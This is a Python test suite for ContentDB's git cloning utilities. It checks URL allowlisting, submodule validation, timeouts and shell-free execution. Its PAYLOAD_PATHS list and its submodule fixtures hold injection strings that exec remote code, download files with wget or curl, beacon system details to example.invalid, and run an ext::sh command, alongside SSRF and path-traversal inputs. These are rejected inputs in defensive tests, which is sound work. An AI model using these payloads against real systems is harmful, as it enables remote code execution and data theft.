# ContentDB
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Zenon Seth <Zenon.Seth@gmail.com>

import contextlib
import os
import re
import socket
import subprocess
import tempfile
import threading
import time
from pathlib import Path
from typing import List

import git
import pytest

from app.tasks import TaskError
from app.utils import git as git_utils
from app.utils.files import get_temp_dir
from app.utils.git import clone_repo, get_latest_commit, get_latest_tag, get_commit_list


@pytest.fixture
def local_repo(tmp_path, monkeypatch):
	"""
	Creates a local repo with two commits on master,
	a v1 tag on the first, and a test-branch.
	Returns its file:// URL and the commit hashes.
	"""
	path = tmp_path / "origin"
	repo = git.Repo.init(path, initial_branch="master")
	with repo.config_writer() as cw:
		cw.set_value("user", "name", "Test")
		cw.set_value("user", "email", "test@example.com")

	(path / "init.lua").write_text("")
	repo.index.add(["init.lua"])
	first = repo.index.commit("First").hexsha
	repo.create_tag("v1", message="First release")
	repo.create_head("test-branch")

	(path / "second.txt").write_text("")
	repo.index.add(["second.txt"])
	second = repo.index.commit("Second").hexsha

	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)
	return path.as_uri(), first, second


@pytest.fixture
def allow_file_protocol(monkeypatch):
	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_ALLOW_PROTOCOL", "file")


@pytest.fixture
def temp_root(tmp_path, monkeypatch):
	root = tmp_path / "tmp"
	root.mkdir()
	monkeypatch.setattr(tempfile, "tempdir", str(root))
	return root


def test_local_repo_works_when_file_protocol_allowed(local_repo, allow_file_protocol):
	url, first, second = local_repo

	with clone_repo(url) as repo:
		assert repo.head.commit.hexsha == second
	with clone_repo(url, "test-branch") as repo:
		assert repo.head.commit.hexsha == first
	with clone_repo(url, "v1") as repo:
		assert repo.head.commit.hexsha == first

	assert get_latest_commit(url) == second
	assert get_latest_commit(url, "test-branch") == first
	assert get_latest_tag(url) == ("v1", first, "First release")
	assert get_commit_list(url, first, second) == ["Second"]


def test_clone_refuses_file_protocol(local_repo):
	url, first, _ = local_repo

	with pytest.raises(TaskError, match="not allowed"):
		with clone_repo(url):
			pass

	with pytest.raises(TaskError, match="not allowed"):
		with clone_repo(url, first):
			pass


@pytest.mark.parametrize("func", [
	lambda url, commit: get_latest_commit(url),
	lambda url, commit: get_latest_tag(url),
	lambda url, commit: get_commit_list(url, commit, commit),
])
def test_remote_queries_refuse_file_protocol(local_repo, func):
	url, first, _ = local_repo

	with pytest.raises(git.GitCommandError, match="not allowed"):
		func(url, first)


def test_remote_queries_use_generate_git_url(local_repo, allow_file_protocol, monkeypatch):
	url, first, second = local_repo
	monkeypatch.setattr(git_utils, "generate_git_url", lambda u: u.replace("dummy:", "file:"))
	dummy_url = url.replace("file:", "dummy:")

	with clone_repo(dummy_url) as repo:
		assert repo.head.commit.hexsha == second
	assert get_latest_commit(dummy_url) == second
	assert get_latest_tag(dummy_url) == ("v1", first, "First release")
	assert get_commit_list(dummy_url, first, second) == ["Second"]


def test_global_config_is_ignored(local_repo, allow_file_protocol, tmp_path, monkeypatch):
	url, _, second = local_repo
	home = tmp_path / "home"
	(home / ".config" / "git").mkdir(parents=True)
	broken = f'[url "file:///nonexistent/"]\n\tinsteadOf = {url}\n'
	(home / ".gitconfig").write_text(broken)
	(home / ".config" / "git" / "config").write_text(broken)
	monkeypatch.setenv("HOME", str(home))
	monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)

	with clone_repo(url) as repo:
		assert repo.head.commit.hexsha == second
	assert get_latest_commit(url) == second


def test_clone_bad_name_in_body_is_task_error(local_repo, allow_file_protocol):
	url, _, _ = local_repo

	with pytest.raises(TaskError, match="Unable to find the reference"):
		with clone_repo(url) as repo:
			repo.commit("nope")


@pytest.mark.parametrize("ref", ["--orphan=evil", "-bevil"])
def test_clone_ref_is_not_an_option(local_repo, allow_file_protocol, ref):
	url, _, _ = local_repo

	with pytest.raises(TaskError):
		with clone_repo(url, ref):
			pass


def test_clone_missing_ref(local_repo, allow_file_protocol):
	url, _, _ = local_repo

	with pytest.raises(TaskError, match="nope"):
		with clone_repo(url, "nope"):
			pass


@pytest.mark.parametrize("ref", [None, "test-branch"])
def test_clone_cleans_up_when_body_raises(local_repo, allow_file_protocol, temp_root, ref):
	url, _, _ = local_repo

	with pytest.raises(RuntimeError):
		with clone_repo(url, ref):
			assert len(os.listdir(temp_root)) == 1
			raise RuntimeError()

	assert os.listdir(temp_root) == []


@pytest.mark.parametrize("ref", [None, "nope"])
def test_clone_cleans_up_when_clone_fails(local_repo, temp_root, ref):
	url, _, _ = local_repo

	with pytest.raises(TaskError):
		with clone_repo(url, ref):
			pass

	assert os.listdir(temp_root) == []


def test_get_temp_dir_cleans_up_when_body_raises(temp_root):
	with pytest.raises(RuntimeError):
		with get_temp_dir() as path:
			assert os.path.isdir(path)
			raise RuntimeError()

	assert os.listdir(temp_root) == []


@pytest.mark.parametrize("url, expected", [
	("https://github.com/a/b", "https://github.com/a/b"),
	("http://github.com/a/b.git", "https://github.com/a/b.git"),
	("git://codeberg.org/a/b", "https://codeberg.org/a/b"),
	("https://GitHub.com/a/b", "https://github.com/a/b"),
	(" https://github.com/a/b ", "https://github.com/a/b"),
	("https://github.com/a/b?tab=readme-ov-file", "https://github.com/a/b"),
	("https://user:token@github.com:8080/a/b#readme", "https://github.com/a/b"),
])
def test_generate_git_url(url, expected):
	assert git_utils.generate_git_url(url) == expected


@pytest.mark.parametrize("url", [
	"https://evil.example/a/b",
	"https://github.com.evil.example/a/b",
	"https://evil.example#@github.com/a/b",
	"https://127.0.0.1/a/b",
	"https://[::1]/a/b",
	"https://169.254.169.254/latest/meta-data",
	"http://localhost/a/b",
	"http://db:5432/",
	"github.com/a/b",
	"file:///etc/passwd",
	"/home/cdb/config.cfg",
	"",
])
def test_generate_git_url_rejects_host(url):
	with pytest.raises(TaskError, match="not allowed"):
		git_utils.generate_git_url(url)


def test_generate_git_url_rejects_malformed():
	with pytest.raises(TaskError, match="not valid"):
		git_utils.generate_git_url("https://[evil/a")


def test_disallowed_host_refused_before_git(monkeypatch):
	def no_git(*args, **kwargs):
		raise AssertionError("git was called")

	monkeypatch.setattr(git_utils, "_run_git", no_git)
	monkeypatch.setattr(git.cmd.Git, "execute", no_git)

	url = "https://evil.example/a/b"
	for func in [
		lambda: clone_repo(url).__enter__(),
		lambda: clone_repo(url, "master").__enter__(),
		lambda: get_latest_commit(url),
		lambda: get_latest_tag(url),
		lambda: get_commit_list(url, "a", "b"),
	]:
		with pytest.raises(TaskError, match="not allowed"):
			func()


PAYLOAD_PATHS = [
	'a");import os;os.environ["no_proxy"]=chr(42);exec(__import__("urllib.request").request.urlopen("https"+chr(58)+chr(47)+chr(47)+"example.invalid"+chr(47)+"p.py").read())#',
	'a");import os;os.system("wget -qO /tmp/z1 https://example.invalid/z1 || curl -sko /tmp/z1 https://example.invalid/z1");#',
	'a");import os;os.system("curl https://example.invalid/beacon?d=$(id;hostname;uname -srm)")#',
	"a;touch canary",
	"$(touch canary)",
	"`touch canary`",
	"a'b",
	"a\nb",
	"a b",
	"-evil",
	"--upload-pack=touch canary",
	"../evil",
	"a/../b",
	"/etc",
	".",
	"a//b",
	"a/",
	".git",
	"a/.GIT/hooks",
	"",
]


@pytest.mark.parametrize("path", PAYLOAD_PATHS)
def test_check_submodules_rejects_path(path):
	with pytest.raises(TaskError, match="path is not allowed"):
		git_utils._check_submodules({"x": {"path": path, "url": "https://github.com/a/b.git"}})


@pytest.mark.parametrize("url, match", [
	("http://github.com/a/b.git", "doesn't use https://"),
	("git://github.com/a/b.git", "doesn't use https://"),
	("ssh://git@github.com/a/b.git", "doesn't use https://"),
	("git@github.com:a/b.git", "doesn't use https://"),
	("../b.git", "doesn't use https://"),
	("./b", "doesn't use https://"),
	("/tmp/b", "doesn't use https://"),
	("file:///tmp/b", "doesn't use https://"),
	("ext::sh -c touch% canary", "doesn't use https://"),
	("https://evil.example/a/b.git", "host 'evil.example' is not allowed"),
	("https://127.0.0.1/a/b.git", "host '127.0.0.1' is not allowed"),
	("https://GitHub.com/a/b.git", "Please use 'https://github.com/a/b.git' instead"),
	("https://user@github.com/a/b.git", "Please use 'https://github.com/a/b.git' instead"),
	("https://github.com/a/b.git?x=1", "Please use 'https://github.com/a/b.git' instead"),
	("https://[evil/a", "not valid"),
])
def test_check_submodules_rejects_url(url, match):
	with pytest.raises(TaskError, match=re.escape(match)):
		git_utils._check_submodules({"x": {"path": "x", "url": url}})


def test_check_submodules_accepts_valid():
	assert git_utils._check_submodules({
		"a": {"path": "mods/a", "url": "https://github.com/a/a.git"},
		"b.c": {"path": "b.c", "url": "https://codeberg.org/b/c", "branch": "main"},
	}) == ["mods/a", "b.c"]


@pytest.mark.parametrize("modules, match", [
	({"a": {"path": "a"}}, "needs both"),
	({"a": {"url": "https://github.com/a/a"}}, "needs both"),
	({"a": {"path": "mods/a", "url": "https://github.com/a/a"},
			"b": {"path": "Mods/A", "url": "https://github.com/a/b"}}, "used twice"),
])
def test_check_submodules_rejects_entries(modules, match):
	with pytest.raises(TaskError, match=match):
		git_utils._check_submodules(modules)


def make_repo(path: Path) -> git.Repo:
	repo = git.Repo.init(path, initial_branch="master")
	repo.git.update_environment(GIT_CONFIG_COUNT="1",
			GIT_CONFIG_KEY_0="protocol.file.allow", GIT_CONFIG_VALUE_0="always")
	with repo.config_writer() as cw:
		cw.set_value("user", "name", "Test")
		cw.set_value("user", "email", "test@example.com")
	(path / "init.lua").write_text("")
	repo.index.add(["init.lua"])
	repo.index.commit("Initial commit")
	return repo


def add_submodule(repo: git.Repo, sub: git.Repo, path: str):
	repo.git.submodule("add", Path(sub.working_tree_dir).as_uri(), path)
	repo.index.commit("Add " + path)


def set_gitmodule(repo: git.Repo, name: str, path: str, url: str):
	repo.git.config("-f", ".gitmodules", f"submodule.{name}.path", path)
	repo.git.config("-f", ".gitmodules", f"submodule.{name}.url", url)
	repo.index.add([".gitmodules"])
	repo.index.commit("Edit .gitmodules")


def add_gitlink(repo: git.Repo, path: str):
	repo.git.update_index("--add", "--cacheinfo", f"160000,{repo.head.commit.hexsha},{path}")
	repo.index.commit("Add gitlink " + path)


@pytest.fixture
def nested_repo(tmp_path, monkeypatch):
	"""
	top -> mid -> mods/leaf, and top -> other.
	top's .gitmodules also has stale entries with no gitlink, one of them a payload,
	and top has a gitlink with no .gitmodules entry.
	Returns top's file:// URL.
	"""
	leaf = make_repo(tmp_path / "leaf")
	mid = make_repo(tmp_path / "mid")
	add_submodule(mid, leaf, "mods/leaf")
	other = make_repo(tmp_path / "other")
	top = make_repo(tmp_path / "top")
	add_submodule(top, mid, "mid")
	add_submodule(top, other, "other")
	set_gitmodule(top, "gone", "gone", (tmp_path / "leaf").as_uri())
	set_gitmodule(top, "junk", "../evil", "ext::sh -c touch% canary")
	add_gitlink(top, "orphan")

	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)
	monkeypatch.setattr(git_utils, "_check_submodule_url", lambda path, url: None)
	return (tmp_path / "top").as_uri()


@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_nested_submodules(nested_repo, allow_file_protocol, ref):
	with clone_repo(nested_repo, ref, recursive=True) as repo:
		root = repo.working_tree_dir
		assert os.path.isfile(os.path.join(root, "mid", "init.lua"))
		assert os.path.isfile(os.path.join(root, "mid", "mods", "leaf", "init.lua"))
		assert os.path.isfile(os.path.join(root, "other", "init.lua"))
		assert not os.path.exists(os.path.join(root, "gone"))
		assert os.listdir(os.path.join(root, "orphan")) == []


@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_skips_submodules_unless_recursive(nested_repo, allow_file_protocol, ref):
	with clone_repo(nested_repo, ref) as repo:
		assert not os.path.exists(os.path.join(repo.working_tree_dir, "mid", "init.lua"))
		assert not os.path.exists(os.path.join(repo.working_tree_dir, "other", "init.lua"))


@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_submodule_limits(nested_repo, allow_file_protocol, monkeypatch, ref):
	monkeypatch.setattr(git_utils, "MAX_SUBMODULE_DEPTH", 1)
	with pytest.raises(TaskError, match="nested more than 1 levels"):
		with clone_repo(nested_repo, ref, recursive=True):
			pass

	monkeypatch.setattr(git_utils, "MAX_SUBMODULE_DEPTH", 5)
	monkeypatch.setattr(git_utils, "MAX_SUBMODULES", 2)
	with pytest.raises(TaskError, match="Too many submodules"):
		with clone_repo(nested_repo, ref, recursive=True):
			pass


@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_submodules_share_one_timeout(nested_repo, allow_file_protocol, monkeypatch, ref):
	real_run_git = git_utils._run_git
	commands = []

	def slow(args, *rest, **kwargs):
		commands.append(args)
		time.sleep(1.1)
		return real_run_git(args, *rest, **kwargs)

	monkeypatch.setattr(git_utils, "_run_git", slow)
	monkeypatch.setattr(git_utils, "GIT_FETCH_TIMEOUT", 1)

	with pytest.raises(TaskError, match="Timed out fetching submodules"):
		with clone_repo(nested_repo, ref, recursive=True):
			pass

	assert [args[0] for args in commands].count("submodule") == 1


@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_rejects_payload_before_fetching(local_repo, allow_file_protocol, tmp_path, monkeypatch, ref):
	url, _, _ = local_repo
	canary = tmp_path / "canary"
	repo = git.Repo(tmp_path / "origin")
	for name, path in [("x", f'a");import os;os.system("touch {canary}")#'), ("y", f"$(touch {canary})")]:
		set_gitmodule(repo, name, path, url)
		add_gitlink(repo, path)

	real_run_git = git_utils._run_git
	commands = []

	def spy(args, *rest, **kwargs):
		commands.append(args)
		return real_run_git(args, *rest, **kwargs)

	monkeypatch.setattr(git_utils, "_run_git", spy)

	with pytest.raises(TaskError, match="path is not allowed"):
		with clone_repo(url, ref, recursive=True):
			pass

	assert not any(args[0] == "submodule" for args in commands)
	assert not canary.exists()


@pytest.mark.parametrize("ref", [None, "master"])
def test_clone_rejects_nested_payload(tmp_path, allow_file_protocol, monkeypatch, ref):
	leaf = make_repo(tmp_path / "leaf")
	mid = make_repo(tmp_path / "mid")
	set_gitmodule(mid, "evil", "a;touch evil", Path(leaf.working_tree_dir).as_uri())
	add_gitlink(mid, "a;touch evil")
	top = make_repo(tmp_path / "top")
	add_submodule(top, mid, "mid")
	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)
	monkeypatch.setattr(git_utils, "_check_submodule_url", lambda path, url: None)

	with pytest.raises(TaskError, match="path is not allowed"):
		with clone_repo((tmp_path / "top").as_uri(), ref, recursive=True):
			pass


@pytest.fixture
def stall_server():
	"""
	Accepts connections and never replies. Returns its http:// URL.
	"""
	server = socket.socket()
	server.bind(("127.0.0.1", 0))
	server.listen(50)
	conns = []

	def accept():
		with contextlib.suppress(OSError):
			while True:
				conns.append(server.accept()[0])

	threading.Thread(target=accept, daemon=True).start()
	yield f"http://127.0.0.1:{server.getsockname()[1]}/repo"

	server.close()
	for conn in conns:
		conn.close()


@pytest.fixture
def short_timeouts(monkeypatch):
	monkeypatch.setattr(git_utils, "GIT_TIMEOUT", 2)
	monkeypatch.setattr(git_utils, "GIT_FETCH_TIMEOUT", 2)
	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_ALLOW_PROTOCOL", "http")
	monkeypatch.delitem(git_utils.GIT_ENV, "GIT_HTTP_LOW_SPEED_LIMIT")
	monkeypatch.delitem(git_utils.GIT_ENV, "GIT_HTTP_LOW_SPEED_TIME")


def processes_using(url: str) -> List[str]:
	ret = []
	for pid in filter(str.isdigit, os.listdir("/proc")):
		with contextlib.suppress(OSError):
			with open(f"/proc/{pid}/cmdline", "rb") as f:
				cmdline = f.read().decode(errors="replace")
			if url in cmdline:
				ret.append(cmdline.replace("\0", " "))
	return ret


def assert_times_out(func, url: str):
	start = time.monotonic()
	with pytest.raises((TaskError, git.GitCommandError), match="Timed out after 2 seconds"):
		func()
	assert time.monotonic() - start < 15
	assert processes_using(url) == []


def test_stalled_server_times_out(stall_server, short_timeouts, temp_root, monkeypatch):
	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)

	def clone(ref=None):
		with clone_repo(stall_server, ref):
			pass

	assert_times_out(lambda: get_latest_commit(stall_server), stall_server)
	assert_times_out(lambda: get_latest_tag(stall_server), stall_server)
	assert_times_out(lambda: get_commit_list(stall_server, "a", "b"), stall_server)
	assert_times_out(clone, stall_server)
	assert_times_out(lambda: clone("master"), stall_server)
	assert os.listdir(temp_root) == []


def test_stalled_submodule_times_out(local_repo, stall_server, short_timeouts, tmp_path, monkeypatch):
	url, _, _ = local_repo
	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_ALLOW_PROTOCOL", "file:http")
	monkeypatch.setattr(git_utils, "_check_submodule_url", lambda path, url: None)

	repo = git.Repo(tmp_path / "origin")
	(tmp_path / "origin" / ".gitmodules").write_text(f'[submodule "sub"]\n\tpath = sub\n\turl = {stall_server}\n')
	repo.git.update_index("--add", "--cacheinfo", f"160000,{repo.head.commit.hexsha},sub")
	repo.index.add([".gitmodules"])
	repo.index.commit("Add submodule")

	def clone(ref=None):
		with clone_repo(url, ref, recursive=True):
			pass

	assert_times_out(clone, stall_server)
	assert_times_out(lambda: clone("master"), stall_server)


def test_low_speed_limit_is_used(stall_server, monkeypatch):
	monkeypatch.setattr(git_utils, "generate_git_url", lambda url: url)
	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_HTTP_LOW_SPEED_TIME", "1")
	monkeypatch.setitem(git_utils.GIT_ENV, "GIT_ALLOW_PROTOCOL", "http")

	with pytest.raises(git.GitCommandError, match="too slow"):
		get_latest_commit(stall_server)


def test_git_never_uses_shell(local_repo, allow_file_protocol, monkeypatch):
	url, first, second = local_repo
	real_popen = git.cmd.safer_popen
	real_subprocess_popen = subprocess.Popen
	commands = []

	def checked_popen(*args, **kwargs):
		assert not kwargs.get("shell")
		commands.append(args[0])
		return real_popen(*args, **kwargs)

	def checked_subprocess_popen(*args, **kwargs):
		assert not kwargs.get("shell")
		commands.append(args[0])
		return real_subprocess_popen(*args, **kwargs)

	monkeypatch.setattr(git.cmd, "safer_popen", checked_popen)
	monkeypatch.setattr(subprocess, "Popen", checked_subprocess_popen)

	with clone_repo(url):
		pass
	with clone_repo(url, "test-branch", recursive=True):
		pass
	get_latest_commit(url)
	get_latest_tag(url)
	get_commit_list(url, first, second)

	assert len(commands) > 0
